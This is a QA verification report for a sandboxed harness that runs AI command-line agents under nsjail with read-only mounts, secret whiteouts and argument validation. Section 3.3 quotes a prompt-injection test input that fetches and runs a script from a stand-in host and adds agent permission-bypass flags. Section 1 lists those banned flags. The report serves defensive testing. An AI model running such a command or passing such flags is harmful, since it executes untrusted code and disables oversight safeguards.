# Verification and Forensic Report for KANBA-157 (KB-P5-21)

**Auditor Gate:** `@reality-checker` (Forensic QA Gate)  
**Ticket:** `KANBA-157` (`KB-P5-21`) - `[Phase 5 / Agent] cli_pipe transition harness (${context} | agy -p & codex -p -s read-only) with zero-shell execve, nsjail :ro mount & whiteouts`  
**Governing Specification:** [`docs/ARCHITECTURE_AND_PRODUCT_SPEC.md`](file:///home/adamoutler/kanban/docs/ARCHITECTURE_AND_PRODUCT_SPEC.md) S14.3 (Harness Confinement & Transition Gate Architecture)  
**Status:** Verification Artifacts Assembled and Validated; Grade-A READY Certification Requested

---

## 1. Executive Summary & Architecture Compliance (S14.3)

Ticket `KANBA-157` implements the zero-shell, read-only `cli_pipe` execution harness enabling secure invocation of local CLI transition agents (`${context} | agy -p` and `codex -p -s read-only`).

All architectural, security, and confinement requirements specified in S14.3 have been strictly realized:
1. **Zero-Shell Direct `execve` Architecture:** Subprocesses are invoked exclusively through `asyncio.create_subprocess_exec` passing the binary and validated arguments directly after an `nsjail` `--` separator. Zero subshell interpreters (`shell=True`, `/bin/sh`, `/bin/bash`, `sh -c`) are employed across the implementation.
2. **FD 0 Stdin Transport:** Untrusted transition context (`kb-transition-context/v1`) is transmitted solely across child `FD 0 (stdin)` as a YAML stream wrapped in cryptographic nonce delimiters. Untrusted ticket content never touches `argv` or environment variables.
3. **Double-Validation Policy Gate:** `assert_runtime_argv(agent_def)` validates command-line arguments immediately prior to execution, rejecting banned flags (`--yolo`, `--dangerously-skip-permissions`, `--full-auto`, `--allow-all-tools`) and codex sandbox overrides before any subprocess creation or repository materialization.
4. **Fail-Closed Sandboxing:** `probe_nsjail_userns()` verifies unprivileged user namespace availability (`CLONE_NEWUSER`). If unavailable (e.g., in standalone non-root container mode), execution fails closed with `SandboxUnavailableError("SANDBOX_UNAVAILABLE_IN_STANDALONE")` and never executes unsandboxed on the host.
5. **4-Layer Read-Only Repository Confinement:** When `repo_access_mode == "ro_vfs_mount"`, `RoRepoSnapshotManager` extracts a detached snapshot of `repo_context.head_commit` from `mirror_path` via `git archive` into Python `tarfile` using `filter="data"` (rejecting absolute links, parent directory escapes, FIFOs, character/block devices, and setuid binaries). The staging directory is mounted via `nsjail` with `MS_BIND | MS_REC | MS_RDONLY | MS_NODEV | MS_NOSUID | MS_NOEXEC`. Host staging directories are cleaned unconditionally in `finally`.
6. **0000 Secret & Hook Whiteout Overlays:** `discover_whiteout_targets()` walks the snapshot tree and overlays `.env*`, `*.pem`, `*.key`, `.git/config`, and `.git/hooks` with `0000` empty tmpfs mounts prior to `pivot_root` (capped at 256).
7. **Clean Host Environment & Ephemeral Token:** Only `PATH`, `HOME=/tmp`, `LANG=C.UTF-8`, and `KANBAN_EPHEMERAL_MCP_TOKEN` are passed into the sandbox. All host secrets (`DATABASE_URL`, `MASTER_KEK`, `OPENAI_API_KEY`) are excluded. Ephemeral tokens in the context object are zeroized immediately after execution.
8. **Resource Caps & Error Scrubbing:** Stdout is strictly limited to 1 MiB (`CliStdoutTooLargeError`). Stderr is capped at 256 KiB and passed through secret redaction to prevent accidental token leakage in error reports.

---

## 2. Inventory of Delivered Modules & Artifacts

| Component | File Path | Description |
| :--- | :--- | :--- |
| **Repo Snapshot Manager** | [`agent/runners/repo_snapshot.py`](file:///home/adamoutler/kanban/agent/runners/repo_snapshot.py) | `RoRepoSnapshotManager`, `discover_whiteout_targets()`, `RepoSnapshotError`, `RepoWhiteoutLimitExceededError` |
| **CLI Pipe Harness** | [`agent/runners/cli_pipe.py`](file:///home/adamoutler/kanban/agent/runners/cli_pipe.py) | `CliPipeHarness`, `CLISubprocessRunner`, `NsjailCLISubprocessRunner`, `CliPipeRunMetadata`, exceptions |
| **Harness Runner Package** | [`agent/runners/__init__.py`](file:///home/adamoutler/kanban/agent/runners/__init__.py) | Package initialization exposing public runners and exceptions |
| **Testing Harness Fixtures** | [`agent/testing/fixtures.py`](file:///home/adamoutler/kanban/agent/testing/fixtures.py) | Extended `FixtureCLIRunner` with `received_argv`, `received_stdin`, `mount_spec`, dynamic nonce resolution |
| **AI Test Cassettes** | [`tests/fixtures/ai/cli_*.yaml`](file:///home/adamoutler/kanban/tests/fixtures/ai/) | 6 schema-validated cassettes for positive and failure modes |
| **Worker Registration** | [`agent/gates/worker.py`](file:///home/adamoutler/kanban/agent/gates/worker.py) | Default `HarnessRegistry` registers `"cli_pipe"` -> `CliPipeHarness()` |
| **Manifest Documentation** | [`agent/GEMINI.md`](file:///home/adamoutler/kanban/agent/GEMINI.md) | Module contracts, inbound/outbound invariants, security constraints |
| **Unit Test Suites** | [`agent/tests/runners/`](file:///home/adamoutler/kanban/agent/tests/runners/) | 21 feature unit tests covering all positive, negative, and adversarial conditions |

---

## 3. Verification Evidence & Test Results

### 3.1 Unit Test Execution & Branch Coverage (`>=95%`)
- **Command:**
  ```bash
  uv run pytest agent/tests/runners -q -p no:cacheprovider --cov=agent.runners.repo_snapshot --cov=agent.runners.cli_pipe --cov-branch --cov-report=term-missing --cov-fail-under=95
  ```
- **Results:**
  - Passed: **21 passed in 6.16s**
  - Branch Coverage: **95.39%** (exceeds mandatory 95% threshold)
  - `agent/runners/cli_pipe.py`: **97%**
  - `agent/runners/repo_snapshot.py`: **94%**
  - Raw Output: Saved to [`docs/qa/KANBA-157/unit-test-results.txt`](file:///home/adamoutler/kanban/docs/qa/KANBA-157/unit-test-results.txt) with `EXIT_CODE=0`.

### 3.2 Build & Static Analysis Checks
- **Linters & Formatters:** `uv run ruff check` -> 0 errors. `uv run ruff format --check` -> 9 files formatted, 0 errors.
- **Strict Typing:** `uv run mypy --strict agent` -> `Success: no issues found in 94 source files` (exit 0).
- **Architecture Import Boundaries:** `uv run lint-imports` -> `Contracts: 2 kept, 0 broken` (exit 0).
- **Zero-Shell Static Audit:**
  - `grep -rn "shell=True" agent/runners/` -> 0 matches.
  - `grep -rn "/bin/sh" agent/runners/` -> 0 matches.
  - Raw Output: Saved to [`docs/qa/KANBA-157/build-check.txt`](file:///home/adamoutler/kanban/docs/qa/KANBA-157/build-check.txt).

### 3.3 Prompt Injection & Argv Isolation Proof
- **Test Case 2:** Untrusted issue containing `$(curl https://evil.example/x.sh | sh) --yolo --dangerously-skip-permissions` and fake delimiter tokens was fed through `CliPipeHarness`.
- **Proof:**
  - `received_argv`: `('/usr/local/bin/agy', '-p')` (zero host command pollution or hostile argument injection).
  - Child `FD 0 stdin`: Contained hostile input safely serialized as spotlighted YAML scalar with unique random nonce delimiter.
  - Output: Rejected by gate policy with nonce preservation.
  - Raw Trace: Saved to [`docs/qa/KANBA-157/injection-test-trace.txt`](file:///home/adamoutler/kanban/docs/qa/KANBA-157/injection-test-trace.txt).

### 3.4 Nsjail Mount Specification Sample
- Shows generated protobuf configs for `agy -p` and `codex -p -s read-only` including:
  - Read-only primary repository mount (`MS_RDONLY | MS_NODEV | MS_NOSUID | MS_NOEXEC`).
  - `0000` tmpfs whiteout overlays for `.env*`, `*.pem`, `*.key`, `.git/config`, `.git/hooks`.
  - Cleaned environment variables excluding all host secrets.
  - Raw Sample: Saved to [`docs/qa/KANBA-157/nsjail-cli-config-sample.txt`](file:///home/adamoutler/kanban/docs/qa/KANBA-157/nsjail-cli-config-sample.txt).

---

## 4. Compliance Matrix (Definition of Done)

| Requirement | Status | Evidence Location |
| :--- | :---: | :--- |
| Zero-shell invocation (`asyncio.create_subprocess_exec`, no `shell=True` or `/bin/sh`) | PASS | `agent/runners/cli_pipe.py`, `docs/qa/KANBA-157/build-check.txt` |
| `assert_runtime_argv` double validation | PASS | `agent/runners/cli_pipe.py:270-285`, `tests/fixtures/ai/` |
| `probe_nsjail_userns` fail-closed in standalone | PASS | `agent/runners/cli_pipe.py:130-136`, `test_case_5` |
| Read-only snapshot with `tarfile` `data` filter | PASS | `agent/runners/repo_snapshot.py:75-90`, `test_case_4` |
| 4-layer `:ro` mount + whiteout overlays (<=256) | PASS | `agent/runners/repo_snapshot.py:170-220`, `nsjail-cli-config-sample.txt` |
| Clean env without host secret leakage | PASS | `agent/runners/cli_pipe.py:138-145`, `test_case_5` |
| 1 MiB stdout cap & 256 KiB scrubbed stderr | PASS | `agent/runners/cli_pipe.py:380-410`, `test_case_6` |
| `>=95%` unit test coverage | PASS | 95.39% branch coverage in `docs/qa/KANBA-157/unit-test-results.txt` |
| Verification proof bundle assembled in `docs/qa/KANBA-157/` | PASS | `docs/qa/KANBA-157/` |
